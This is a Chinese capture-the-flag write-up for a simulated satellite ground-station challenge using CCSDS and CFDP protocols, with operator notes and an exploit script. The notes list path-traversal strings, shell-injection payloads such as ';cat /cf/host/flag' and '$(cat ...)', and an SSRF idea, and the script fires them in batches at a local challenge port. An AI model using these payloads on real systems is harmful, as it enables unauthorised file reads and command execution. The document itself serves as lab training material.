# 知识点

Challenges

# 题目分析

分类：Misc / Challenges。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [ORIGINAL_NOTES.md](ORIGINAL_NOTES.md)
- [addr.txt](addr.txt)
- [auto.py](auto.py)
- [exploit.py](exploit.py)
- [hunt2.py](hunt2.py)
- [live_hunt.py](live_hunt.py)
- [recon.py](recon.py)
- [satlib.py](satlib.py)
- [watch.py](watch.py)

## 已有分析

- [ORIGINAL_NOTES.md](ORIGINAL_NOTES.md)

### 模拟卫星测控站 —— 作战笔记

目标：`/cf/host/flag`（卫星宿主文件系统）
入口：`nc 127.0.0.1 24619`
附件：无

---

#### 0. 现场实测（先说结论）

| 时刻 | 动作 | 结果 |
|---|---|---|
| 18:41–18:55 | TCP connect | 成功（三次握手 OK） |
| 同上 | 静默等待 | 3.2~4.6s 后 **FIN，零字节** |
| 同上 | 发 `C`/`T`/`F`/`E` 单字节、`C+len2`、`C+len4`、CCSDS TC、ASCII | 全部零字节后 FIN |
| 同上 | TLS 握手 | EOF（不是 TLS） |

→ 端口在 listen，但后端进程没产出任何东西。这是动态容器型题目 **实例没起来 / 已过期** 的典型症状。
处理：面板点「重新下发」，等满 ~2 分钟初始化，再跑 `watch.py` 直到出现非空回应。

---

#### 1. 协议模型（按题面反推）

```
地面站 ──C(CCSDS TC 命令包)──> 卫星
地面站 ──F(CFDP PDU)────────> 卫星
卫星   ──T(CCSDS TM 遥测包)──> 地面站
卫星   ──E(ASCII 错误文本)───> 地面站
```

- **E 帧是免费 oracle**：题面专门列出来，等于告诉你服务端会解释"你哪里发错了"。
  黑盒逆向的全部效率都来自它——先故意发坏包，把字段名、长度规则、命令表从错误文本里抠出来。
- 帧封装必须试：`type(1) + len(2 BE) + body` / `len(4 BE)` / `len(2 LE)` / `type+body` / `type hex\n`。
- CCSDS 包主头 6 字节：`pkt_id(2) seq(2) len(2)`，TC 的 `pkt_id` bit12=1；功能码一般在数据域前 2 字节。
- CFDP PDU 头：`ver(3)|type(1)|dir(1)|mode(1)|crc(1)|large(1)` + 长度(2) + 实体号 + 事务号 + 目标实体号。

---

#### 2. 为什么一定打得穿：/cf/host/flag 这个路径本身就是答案

```
/cf                 <- CFDP 虚拟文件系统根
/cf/station/...     <- 你的"有限权限"：地面站沙箱目录
/cf/host/flag       <- 卫星宿主根，越权目标
```

权限模型基本是 **"前缀白名单"**。前缀白名单必然输给路径规范化差异，可用变体：

```
/cf/host/flag
../host/flag
/cf/station/../host/flag
/cf/station/../../host/flag
....//host/flag                 (过滤 ../ 后二次拼接)
..%2fhost%2fflag                (只过滤字面 ../)
/cf//host//flag                 (空段绕过)
/cf/station/./../../host/flag
```

---

#### 3. 四条路线（按命中概率排序）

##### A. CFDP Metadata Put —— 源文件名穿越（最可能）
CFDP 的 `Metadata PDU` 带 **Source Filename / Destination Filename** 两个 LV 字段。
当卫星作为**发送方**执行 Put 时，`Source Filename` 就是它要读的本地路径。
把它设成 `/cf/host/flag`（或穿越变体），卫星就会按 File Data PDU 把 flag 切片推给你。

1. `F` + Metadata(directive 0x07/0x03), dir=toward-sender, mode=class1(不可靠，免 ACK 流程)
2. src=`TRAVERSALS[i]`，dst=`/cf/station/loot`
3. 收 `F` File Data PDU，拼 data field（跳过 4 字节 offset）
4. 补 EOF PDU / Finished PDU 收尾（class2 时）

##### B. CCSDS 命令包参数注入
功能码枚举（0x00–0xFF）→ 找出带字符串参数的命令 → 参数里塞
`;cat /cf/host/flag`、`|cat ...`、`$(cat ...)`、反引号、`\n`。
命令包常常只校验"命令号权限"，不校验参数内容。

##### C. Proxy Put 反向请求
`Proxy Put Request` 让**卫星主动连回你**（你在公网起 listener）。
- 用途 1：拿到卫星服务端实现的完整 cfg，看它真实路径映射
- 用途 2：把 `/cf/host/flag` 当 payload 塞进代理请求
- 用途 3：顺手做 SSRF，读 `file:///cf/host/flag` / 元数据接口

##### D. 遥测/错误文本泄漏
先 `T` 请求遥测：很多模拟器把 "文件列表 / 目录 / 当前权限 / 允许的路径前缀" 直接吐在 TM 数据域里。
E 帧错误文本往往会回显你发的原始路径 —— 顺便验证穿越字符串有没有被规范化。

---

#### 4. 拿不到 E/T 回应时的兜底
1. 用 `recon.py` 的 stage2 做首字节全量 fuzz（0x00–0xFF × 5 种封装），确认真正入口字节。
2. 检查是否 **先要登录帧**：`C` 帧里塞 `user/pass`、token、`HELLO`。
3. 观察关闭时机：固定 3~4s 关闭 ⇒ 服务端有 `alarm()` 或初始化超时，说明**它真的在跑**但没读到你的帧 ⇒ 封装猜错。
4. 若连接后立刻 FIN 且从不读数据 ⇒ 实例挂了，重新下发。

---

#### 5. 工具
- `satlib.py` —— 帧封装/拆帧、CCSDS TC/TM、CFDP PDU（含 Metadata/FileData/EOF）
- `recon.py`  —— banner、封装判定、首字节 fuzz、功能码枚举
- `exploit.py`—— 四条路线跑批，自动正则抓 flag
- `watch.py`  —— 守候实例上线，一有回应写 `hits.log`

```bash
python3 recon.py           # 先摸协议
python3 exploit.py a       # 只打 CFDP 路线
python3 exploit.py all     # 四条全跑
```


# EXP

- [auto.py](auto.py)
- [exploit.py](exploit.py)
- [hunt2.py](hunt2.py)
- [live_hunt.py](live_hunt.py)
- [recon.py](recon.py)
- [satlib.py](satlib.py)
- [watch.py](watch.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""利用骨架：一旦 recon 拿到可交互的帧封装，就按这里逐层打。
战术假设：/cf 是 CFDP 虚拟文件系统根，station=地面站可写目录，host=卫星宿主根。
有限权限 => 只能操作 /cf/station；目标 => 从 /cf/host/flag 读文件。
"""
import struct, time, sys, re
sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
from satlib import *

HOST, PORT = "127.0.0.1", 24619
MODE = "len2be"          # recon 判定后改这里
APID = 0x064             # recon 判定后改这里

FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,}\{[^}]{4,}\}")

# 穿越变体：从地面站沙箱爬到 host 根
TRAVERSALS = [
    "/cf/host/flag",
    "../host/flag",
    "../../host/flag",
    "/cf/station/../../host/flag",
    "/cf/station/../host/flag",
    "..%2fhost%2fflag",
    "....//host/flag",
    "/cf//host//flag",
    "/cf/station/./../../host/flag",
]


def talk(payload, wait=3.0, tag=""):
    s = Session(HOST, PORT)
    try:
        s.send(payload)
        out = s.drain(wait)
    finally:
        s.close()
    if out:
        print("  [%s] -> %r" % (tag, out[:400]))
        m = FLAG_RE.search(out)
        if m:
            print("  *** FLAG:", m.group().decode())
    else:
        print("  [%s] -> (空)" % tag)
    return out


# ---------------------------------------------------------------- 路线 A
def route_cfdp_metadata():
    """F 帧：Metadata Put Request，源文件名=卫星本地文件 => 卫星读它并下发给你"""
    print("\n[A] CFDP Metadata PDU 路径穿越读取")
    for d in (0x07, 0x03):                      # 两种 directive 编号约定
        for path in TRAVERSALS:
            md = cfdp_metadata(path, "/cf/station/loot")
            pdu = cfdp_pdu(0, direction=1, mode=1, data=md, src=1, dst=2, txn=1)  # 不可靠类
            talk(frame("F", pdu, MODE), 3.0, "md dir=0x%02x %s" % (d, path))


# ---------------------------------------------------------------- 路线 B
def route_ccsds_cmd():
    """C 帧：找带文件名字段的 TC，做参数注入 / 穿越"""
    print("\n[B] CCSDS 命令包参数注入")
    cands = [
        b"GET /cf/host/flag", b"READ /cf/host/flag", b"CAT /cf/host/flag",
        b"/cf/host/flag;cat /cf/host/flag", b"/cf/host/flag|cat /cf/host/flag",
        b"/cf/host/flag`cat /cf/host/flag`", b"$(cat /cf/host/flag)",
        b"../../../host/flag", b"/cf/host/flag\n",
    ]
    for fcode in (0x01, 0x02, 0x03, 0x10, 0x20, 0x21, 0x30, 0x40):
        for c in cands:
            talk(frame("C", ccsds_tc(APID, fcode, c), MODE), 2.0,
                 "fcode=0x%02x %r" % (fcode, c[:28]))


# ---------------------------------------------------------------- 路线 C
def route_proxy_put():
    """Proxy Put：让卫星主动连回我们的地面站（SSRF/反向拿文件/拿凭据）"""
    print("\n[C] CFDP Proxy Put Request")
    req = bytes([0x09]) + struct.pack(">H", 1) + b"\x00\x01\x00\x02"  # 占位：按实测格式补
    for path in TRAVERSALS:
        md = bytes([0x09]) + lv("/cf/station/inbox") + lv(path)
        pdu = cfdp_pdu(0, direction=1, mode=1, data=md, src=1, dst=2)
        talk(frame("F", pdu, MODE), 3.0, "proxy %s" % path)


# ---------------------------------------------------------------- 路线 D
def route_telemetry_pull():
    """T/E 帧读回来看看遥测里是否夹带文件内容 / 错误文本泄露路径规则"""
    print("\n[D] 请求遥测（触发 E 帧错误文本泄露）")
    for apid in (0x064, 0x001, 0x7FF, 0x000):
        talk(frame("C", ccsds_tc(apid, 0x0000), MODE), 2.0, "apid=0x%03x ping" % apid)


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    table = {"a": route_cfdp_metadata, "b": route_ccsds_cmd,
             "c": route_proxy_put, "d": route_telemetry_pull}
    if which == "all":
        for f in table.values():
            f()
    else:
        table[which]()
```
